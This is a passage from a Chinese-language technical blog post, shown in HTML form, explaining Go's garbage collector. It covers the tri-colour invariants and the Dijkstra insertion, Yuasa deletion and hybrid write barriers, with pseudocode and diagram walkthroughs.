_p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.buf</span><span class="hljs-selector-attr">[:n]</span><br><br>        _p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.next</span> = <span class="hljs-number">0</span><br><br>        gcw := &amp;_p_<span class="hljs-selector-class">.gcw</span><br>        pos := <span class="hljs-number">0</span><br>    <span class="hljs-comment">// 循环批量处理队列里的值，这个就是之前在 gcWriteBarrier 赋值的</span><br>        <span class="hljs-keyword">for</span> _, ptr := range ptrs &#123;<br>                <span class="hljs-keyword">if</span> ptr &lt; minLegalPointer &#123;<br>                        continue<br>                &#125;<br>                obj, <span class="hljs-selector-tag">span</span>, objIndex := <span class="hljs-built_in">findObject</span>(ptr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">if</span> obj == <span class="hljs-number">0</span> &#123;<br>                        continue<br>                &#125;<br><br>                mbits := <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.markBitsForIndex</span>(objIndex)<br>                <span class="hljs-keyword">if</span> mbits<span class="hljs-selector-class">.isMarked</span>() &#123;<br>                        continue<br>                &#125;<br>                mbits<span class="hljs-selector-class">.setMarked</span>()<br>                <span class="hljs-keyword">if</span> <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.spanclass</span><span class="hljs-selector-class">.noscan</span>() &#123;<br>                        gcw<span class="hljs-selector-class">.bytesMarked</span> += <span class="hljs-built_in">uint64</span>(<span class="hljs-selector-tag">span</span>.elemsize)<br>                        continue<br>                &#125;<br>                ptrs<span class="hljs-selector-attr">[pos]</span> = obj<br>                pos++<br>        &#125;<br><br>        <span class="hljs-comment">// 置灰色（投入灰色的队列），这就是我们的目的，对象在这里面我们就不怕了，我们要扫描的就是这个队列；</span><br>        gcw<span class="hljs-selector-class">.putBatch</span>(ptrs<span class="hljs-selector-attr">[:pos]</span>)<br><br>        _p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.reset</span>()<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们总结下，写屏障到底做了什么：</p><ol><li>hook 写操作</li><li>hook 住了写操作之后，把赋值语句的前后两个值都记录下来，投入 buffer 队列</li><li>buffer 攒满之后，批量刷到扫描队列（置灰）（这是 GO 1.10 左右引入的优化）</li></ol><p><strong><code>main.funcAlloc1</code></strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">17 </span>func funcAlloc1 (b *Tstruct) &#123;<br><span class="hljs-symbol">18 </span>    var b0 Tstruct<br><span class="hljs-symbol">19 </span>    b0.<span class="hljs-keyword">base</span> = <span class="hljs-keyword">new</span>(BaseStruct)  // <span class="hljs-keyword">new</span> 一个BaseStruct结构体，赋值给 b0.<span class="hljs-keyword">base</span> 字段<br><span class="hljs-symbol">20 </span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/liqingqiya/liqingqiya.github.io/images/posts/2020-07-11-gc2/FB0B964D-0A0F-4650-8700-45C4278E704E.png"></p><p>最后，再回顾看下 <code>main.funcAlloc1</code> 函数，这个函数是只有栈操作，非常简单。</p><h4 id="“强-弱”-三色不变式"><a href="#“强-弱”-三色不变式" class="headerlink" title="“强-弱” 三色不变式"></a>“强-弱” 三色不变式</h4><p>我们让GC回收器，满足下面两种情况之一时，即可保对象不丢失。  这两种方式就是<strong>“强三色不变式”和“ 弱三色不变式”</strong>。</p><ul><li>强三色不变式</li></ul><p>不存在黑色对象引用到白色对象的指针。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036383192-cb6b9fe9-4946-47da-bb9a-643f0c38a654.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>弱三色不变色实际上是强制性的不允许黑色对象引用白色对象，这样就不会出现有白色对象被误删的情况。</p><ul><li>弱三色不变式</li></ul><p>所有被黑色对象引用的白色对象都处于灰色保护状态（允许黑色对象指向白色对象，但必须保证一个前提，这个白色对象必须处于灰色对象的保护下）。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036404003-e0ea569e-7a8a-4d9f-a08f-4bb9ed5c64ed.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>弱三色不变式强调，黑色对象可以引用白色对象，但是这个白色对象必须存在其他灰色对象对它的引用，或者可达它的链路上游存在灰色对象。 这样实则是黑色对象引用白色对象，白色对象处于一个危险被删除的状态，但是上游灰色对象的引用，可以保护该白色对象，使其安全。</p><p>为了遵循上述的两个方式，GC算法演进到两种屏障方式，他们<strong>“插入写屏障”, “删除写屏障”</strong>。</p><p><strong>插入写屏障：</strong></p><p><code>具体操作</code>: 在A对象引用B对象的时候，B对象被标记为灰色。(将B挂在A下游，B必须被标记为灰色)</p><p><code>满足</code>: <strong>强三色不变式</strong>. (不存在黑色对象引用白色对象的情况了， 因为白色会强制变成灰色)</p><p><strong>删除写屏障：</strong></p><p><code>具体操作</code>: 被删除的对象，如果自身为灰色或者白色，那么被标记为灰色。</p><p><code>满足</code>: <strong>弱三色不变式</strong>. (保护灰色对象到白色对象的路径不会断)</p><h3 id="（一）插入写屏障"><a href="#（一）插入写屏障" class="headerlink" title="（一）插入写屏障"></a><strong>（一）插入写屏障</strong></h3><p>Dijkstra在1978年提出了插入写屏障，也被叫做增量更新，通过如下所示的写屏障，破坏上述第一个条件（赋值器插入了一条或多条从黑色对象到白色对象的新引用）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span> DijkstraWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) <br>     shade(ptr)  <span class="hljs-regexp">//</span>先将新下游对象 ptr 标记为灰色<br>     *slot = ptr<br>&#125;<br><br><span class="hljs-regexp">//</span>说明：<br>添加下游对象(当前下游对象slot, 新下游对象ptr) &#123; <br> <span class="hljs-regexp">//</span>step <span class="hljs-number">1</span><br> 标记灰色(新下游对象ptr) <br> <br> <span class="hljs-regexp">//</span>step <span class="hljs-number">2</span><br> 当前下游对象slot = 新下游对象ptr <br>&#125;<br><br><span class="hljs-regexp">//</span>场景：<br>A.添加下游对象(nil, B) <span class="hljs-regexp">//</span>A 之前没有下游， 新添加一个下游对象B， B被标记为灰色<br>A.添加下游对象(C, B) <span class="hljs-regexp">//</span>A 将下游对象C 更换为B， B被标记为灰色<br></code></pre></td></tr></table></figure><p>上述伪代码非常好理解，当黑色对象（slot）插入新的指向白色对象（ptr）的引用关系时，就尝试使用shade函数将这个新插入的引用（ptr）标记为灰色。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VY8SELNGe94Cjxng5VbT4M7FkUgyAfhpj99S1E3KkyG9kbgAWz9mcJeJthjrVDZZ47DHBs3IgiaicSxjVvhlKUsw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>假设我们上图的例子并发可达性分析中使用插入写屏障：</p><p>1.GC 将根对象Root2指向的B对象标记成黑色并将B对象指向的对象D标记成灰色；</p><p>2.用户程序修改指针，<strong>B.next&#x3D;H</strong>这时触发写屏障将H对象标记成灰色；</p><p>3.用户程序修改指针<strong>D.next&#x3D;null</strong>；</p><p>4.GC依次遍历程序中的H和D将它们分别标记成黑色。</p><h3 id="关于栈没有写屏障的原因"><a href="#关于栈没有写屏障的原因" class="headerlink" title="关于栈没有写屏障的原因"></a>关于栈没有写屏障的原因</h3><p> 黑色对象的内存槽有两种位置, <code>栈</code>和<code>堆</code>. 栈空间的特点是<strong>容量小</strong>,但是<strong>要求响应速度快,因为函数调用弹出频繁使用</strong>, 所以“插入屏障”机制,在<strong>栈空间的对象操作中不使用</strong>. 而仅仅使用在堆空间对象的操作中.</p><p><strong>由于栈上的对象在垃圾回收中被认为是根对象，并没有写屏障，那么导致黑色的栈可能指向白色的堆对象。为了保障内存安全，Dijkstra必须为栈上的对象增加写屏障或者在标记阶段完成重新对栈上的对象进行扫描，这两种方法各有各的缺点，前者会大幅度增加写入指针的额外开销，后者重新扫描栈对象时需要暂停程序，垃圾收集算法的设计者需要在这两者之前做出权衡。</strong></p><p>​接下来，我们用几张图，来模拟整个一个详细的过程， 希望您能够更可观的看清晰整体流程。</p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036442131-91f36e55-5c94-4931-a140-58ff5627c681.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036449149-2fb53d7c-d351-4305-84a8-7a1b51806ce4.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036456806-6b1aeb27-831d-43d9-a79e-4dad49fea07d.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036465710-e260440e-b53d-4f76-a826-842e28666efe.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036474130-755abe1f-d070-47e6-93cf-7aa129489206.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036481384-c4e44929-09e4-4a05-81bb-b5e9ed195982.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>​但是如果栈不添加,当全部三色标记扫描之后,栈上有可能依然存在白色对象被引用的情况(如上图的对象9).  所以要对栈重新进行三色标记扫描, 但这次为了对象不丢失, 要对本次标记扫描启动STW暂停. 直到栈空间的三色标记结束.</p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036522462-5e0c1ea9-e136-45c8-9648-bf691b270431.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036531031-d37d4239-9b13-4d0e-a9cc-d7bc230d56a8.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036538543-d84895c0-451d-4c49-9c67-f77dcf5a3ae9.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><p>​最后将栈和堆空间 扫描剩余的全部 白色节点清除.  这次STW大约的时间在10~100ms间.</p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036559017-4564c417-9059-415c-aa81-d9504ac4e00b.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><h3 id="（二）删除写屏障"><a href="#（二）删除写屏障" class="headerlink" title="（二）删除写屏障"></a><strong>（二）删除写屏障</strong></h3><p>Yuasa在1990年的论文Real-time garbage collection on general-purpose machines 中提出了删除写屏障，因为一旦该写屏障开始工作，它会保证开启写屏障时堆上所有对象的可达。起始时STW扫描所有的goroutine栈，保证所有堆上在用的对象都处于灰色保护下，所以也被称作<strong>快照垃圾收集或者原始快照</strong>（Snapshot GC），这是破坏了“对象消失”的第二个条件（赋值器删除了全部从灰色对象到该白色对象的直接或间接引用）</p><p>原始快照(Snapshot At The Beginning，SATB)。当某个时刻 的 GC Roots 确定后，当时的对象图就已经确定了。当赋值器（业务线程）从灰色或者白色对象中删除白色指针时候，写屏障会捕捉这一行为，将这一行为通知给回收器。这样，基于起始快照的解决方案保守地将其目标对象当作存活的对象，这样就绝对不会有被误回收的对象，但是有扫描工作量浮动放大的风险。术语叫做追踪波面的回退。这个操作在「修改操作前」进行，JVM中 的 G1 垃圾回收器用的也是这个思路。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 黑色赋值器 Yuasa 屏障<br><span class="hljs-keyword">func</span> YuasaWritePointer(slot *unsafe.Pointer, ptr unsafe.Pointer) &#123;<br>    shade(*slot) 先将*slot标记为灰色<br>    *slot = ptr<br>&#125;<br><br><span class="hljs-regexp">//</span>说明：<br>添加下游对象(当前下游对象slot， 新下游对象ptr) &#123;<br>  <span class="hljs-regexp">//</span>step <span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> (当前下游对象slot是灰色 || 当前下游对象slot是白色) &#123;<br>          标记灰色(当前下游对象slot)     <span class="hljs-regexp">//</span>slot为被删除对象， 标记为灰色<br>  &#125;  <br>  <span class="hljs-regexp">//</span>step <span class="hljs-number">2</span><br>  当前下游对象slot = 新下游对象ptr<br>&#125;<br><br><span class="hljs-regexp">//</span>场景<br>A.添加下游对象(B, nil)   <span class="hljs-regexp">//</span>A对象，删除B对象的引用。B被A删除，被标记为灰(如果B之前为白)<br>A.添加下游对象(B, C)     <span class="hljs-regexp">//</span>A对象，更换下游B变成C。B被A删除，被标记为灰(如果B之前为白)<br></code></pre></td></tr></table></figure><p>上述代码会在老对象的引用被删除时，将白色的老对象涂成灰色，这样删除写屏障就可以保证弱三色不变性，老对象引用的下游对象一定可以被灰色对象引用。</p><p>但是这样也会导致一个问题，由于会将<strong>有存活可能的对象都标记成灰色</strong>，因此最后可能会导致应该回收的对象未被回收，这个对象只有在下一个循环才会被回收，比如下图的D对象。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VY8SELNGe94Cjxng5VbT4M7FkUgyAfhpTuHVXfE7fSIbu8yNpJt877FyhAQuBB96eYr2wH7QcxKBIVxNrssIyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>由于原始快照的原因，起始也是执行STW，删除写屏障不适用于栈特别大的场景，栈越大，STW扫描时间越长。</strong></p><p>接下来，我们用几张图，来模拟整个一个详细的过程， 希望您能够更可观的看清晰整体流程。</p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_1.png" alt="delete_barrier_1"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_2.png" alt="delete_barrier_2"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_3.png" alt="delete_barrier_3"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_4.png" alt="delete_barrier_4"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_5.png" alt="delete_barrier_5"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_6.png" alt="delete_barrier_6"></p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/delete_barrier_7.png" alt="delete_barrier_7"></p><p>这种方式的回收精度低，一个对象即使被删除了最后一个指向它的指针也依旧可以活过这一轮，在下一轮GC中被清理掉。</p><p><strong>插入写屏障和删除写屏障的短板：</strong></p><ul><li>插入写屏障：结束时需要STW来重新扫描栈，标记栈上引用的白色对象的存活； </li><li>删除写屏障：回收精度低，GC开始时STW扫描堆栈来记录初始快照，这个过程会保护开始时刻的所有存活对象。</li></ul><h3 id="（三）混合写屏障"><a href="#（三）混合写屏障" class="headerlink" title="（三）混合写屏障"></a><strong>（三）混合写屏障</strong></h3><p>在 Go 语言 v1.7版本之前，运行时会使用Dijkstra插入写屏障保证强三色不变性，但是运行时并没有在所有的垃圾收集根对象上开启插入写屏障。因为应用程序可能包含成百上千的Goroutine，而垃圾收集的根对象一般包括全局变量和栈对象，如果运行时需要在几百个Goroutine的栈上都开启写屏障，会带来巨大的额外开销，所以 Go 团队在v1.8结合上述2种写屏障构成了混合写屏障，实现上选择了在标记阶段完成时暂停程序、将所有栈对象标记为灰色并重新扫描。</p><p>Go 语言在v1.8组合Dijkstra插入写屏障和Yuasa删除写屏障构成了如下所示的混合写屏障，该写屏障会将被覆盖的对象标记成灰色并在当前栈没有扫描时将新对象也标记成灰色：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">writePointer</span><span class="hljs-params">(slot, ptr)</span></span>:<br>    <span class="hljs-built_in">shade</span>(*slot)<br>    <span class="hljs-keyword">if</span> current stack is grey:<br>        <span class="hljs-built_in">shade</span>(ptr)<br>    *slot = ptr<br></code></pre></td></tr></table></figure><p>避免了对栈re-scan的过程，极大的减少了STW的时间。结合了两者的优点。</p><p>最本质的区别就是：<strong>内存屏障其实就是编译器帮你生成的一段 hook 代码</strong>，这三个屏障的本质区别就是 hook 的时机不同而已。</p><hr><h4 id="1-混合写屏障规则"><a href="#1-混合写屏障规则" class="headerlink" title="(1) 混合写屏障规则"></a>(1) 混合写屏障规则</h4><p><code>具体操作</code>:</p><p>1、GC开始将栈上的对象全部扫描并标记为黑色(之后不再进行第二次重复扫描，无需STW)，</p><p>2、GC期间，任何在栈上创建的新对象，均为黑色。</p><p>3、被删除的对象标记为灰色。</p><p>4、被添加的对象标记为灰色。</p><p><code>满足</code>: 变形的<strong>弱三色不变式</strong>.</p><p>伪代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">添加下游对象(当前下游对象slot, 新下游对象ptr) &#123;<br>  <span class="hljs-comment">//1 </span><br>标记灰色(当前下游对象slot)    <span class="hljs-comment">//只要当前下游对象被移走，就标记灰色</span><br>  <br>  <span class="hljs-comment">//2 </span><br>  标记灰色(新下游对象ptr)<br>  <br>  <span class="hljs-comment">//3</span><br>  当前下游对象slot = 新下游对象ptr<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意， 屏障技术是不在栈上应用的，因为要保证栈的运行效率。</p><h4 id="2-混合写屏障的具体场景分析"><a href="#2-混合写屏障的具体场景分析" class="headerlink" title="(2) 混合写屏障的具体场景分析"></a>(2) 混合写屏障的具体场景分析</h4><p>接下来，我们用几张图，来模拟整个一个详细的过程， 希望您能够更可观的看清晰整体流程。</p><p>注意混合写屏障是Gc的一种屏障机制，所以只是当程序执行GC的时候，才会触发这种机制。</p><h5 id="GC开始：扫描栈区，将可达对象全部标记为黑"><a href="#GC开始：扫描栈区，将可达对象全部标记为黑" class="headerlink" title="GC开始：扫描栈区，将可达对象全部标记为黑"></a>GC开始：扫描栈区，将可达对象全部标记为黑</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036708530-f7c50de5-6a63-45dc-baef-f53b1b42eb62.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036716310-65729a9c-d8df-40ce-9c2b-d35228278791.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><hr><h5 id="场景一：-对象被一个堆对象删除引用，成为栈对象的下游"><a href="#场景一：-对象被一个堆对象删除引用，成为栈对象的下游" class="headerlink" title="场景一： 对象被一个堆对象删除引用，成为栈对象的下游"></a>场景一： 对象被一个堆对象删除引用，成为栈对象的下游</h5><p>伪代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//前提：堆对象4-&gt;对象7 = 对象7；  //对象7 被 对象4引用</span><br>栈对象<span class="hljs-number">1</span>-&gt;对象<span class="hljs-number">7</span> = 堆对象<span class="hljs-number">7</span>；  <span class="hljs-comment">//将堆对象7 挂在 栈对象1 下游</span><br>堆对象<span class="hljs-number">4</span>-&gt;对象<span class="hljs-number">7</span> = null；    <span class="hljs-comment">//对象4 删除引用 对象7</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036737874-a2f71441-c4f9-4f74-8c8a-c5a53bd35d4c.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036745104-24b7bf17-27b9-4531-97b7-48c5b7e64fac.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><h5 id="场景二：-对象被一个栈对象删除引用，成为另一个栈对象的下游"><a href="#场景二：-对象被一个栈对象删除引用，成为另一个栈对象的下游" class="headerlink" title="场景二： 对象被一个栈对象删除引用，成为另一个栈对象的下游"></a>场景二： 对象被一个栈对象删除引用，成为另一个栈对象的下游</h5><p>伪代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">new</span> 栈对象<span class="hljs-number">9</span>；<br>对象<span class="hljs-number">8</span>-&gt;对象<span class="hljs-number">3</span> = 对象<span class="hljs-number">3</span>；      <span class="hljs-comment">//将栈对象3 挂在 栈对象9 下游</span><br>对象<span class="hljs-number">2</span>-&gt;对象<span class="hljs-number">3</span> = null；      <span class="hljs-comment">//对象2 删除引用 对象3</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036778055-bda31c21-45dc-4602-9241-11a33b6393a6.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036785024-0edb665e-7b4b-46e3-b8cf-1d4ff02e73cd.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036791814-78eed337-a9ac-42d9-bcd8-99a21c01111c.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><h5 id="场景三：对象被一个堆对象删除引用，成为另一个堆对象的下游"><a href="#场景三：对象被一个堆对象删除引用，成为另一个堆对象的下游" class="headerlink" title="场景三：对象被一个堆对象删除引用，成为另一个堆对象的下游"></a>场景三：对象被一个堆对象删除引用，成为另一个堆对象的下游</h5><p>伪代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">堆对象<span class="hljs-number">10</span>-&gt;对象<span class="hljs-number">7</span> = 堆对象<span class="hljs-number">7</span>；       <span class="hljs-comment">//将堆对象7 挂在 堆对象10 下游</span><br>堆对象<span class="hljs-number">4</span>-&gt;对象<span class="hljs-number">7</span> = null；         <span class="hljs-comment">//对象4 删除引用 对象7</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036826144-893174fb-0111-4838-9f7d-38fe2f89648a.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036833484-a18064d9-1329-42d7-8687-8a029542e85e.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036840569-f50df9db-5219-48fe-83ff-c3545ed4dec4.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><h5 id="场景四：对象从一个栈对象删除引用，成为另一个堆对象的下游"><a href="#场景四：对象从一个栈对象删除引用，成为另一个堆对象的下游" class="headerlink" title="场景四：对象从一个栈对象删除引用，成为另一个堆对象的下游"></a>场景四：对象从一个栈对象删除引用，成为另一个堆对象的下游</h5><p>伪代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">堆对象<span class="hljs-number">10</span>-&gt;对象<span class="hljs-number">7</span> = 堆对象<span class="hljs-number">7</span>；       <span class="hljs-comment">//将堆对象7 挂在 堆对象10 下游</span><br>堆对象<span class="hljs-number">4</span>-&gt;对象<span class="hljs-number">7</span> = null；         <span class="hljs-comment">//对象4 删除引用 对象7</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036859560-21a75ea4-ee66-46ae-81bc-ce4e697c3814.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036864959-929ec428-e8d8-48a9-aaeb-e2589723ec62.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651036876957-976a0ac6-6c82-4eca-88f3-10180782281c.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p><p>​Golang中的混合写屏障满足<code>弱三色不变式</code>，结合了删除写屏障和插入写屏障的优点，只需要在开始时并发扫描各个goroutine的栈，使其变黑并一直保持，这个过程不需要STW，而标记结束后，因为栈在扫描后始终是黑色的，也无需再进行re-scan操作了，减少了STW的时间。</p><h2 id="五、GC演进过程"><a href="#五、GC演进过程" class="headerlink" title="五、GC演进过程"></a><strong>五、GC演进过程</strong></h2><p>v1.0 — 完全串行的标记和清除过程，需要暂停整个程序；</p><p>v1.1 — 在多核主机并行执行垃圾收集的标记和清除阶段；</p><p>v1.3 — 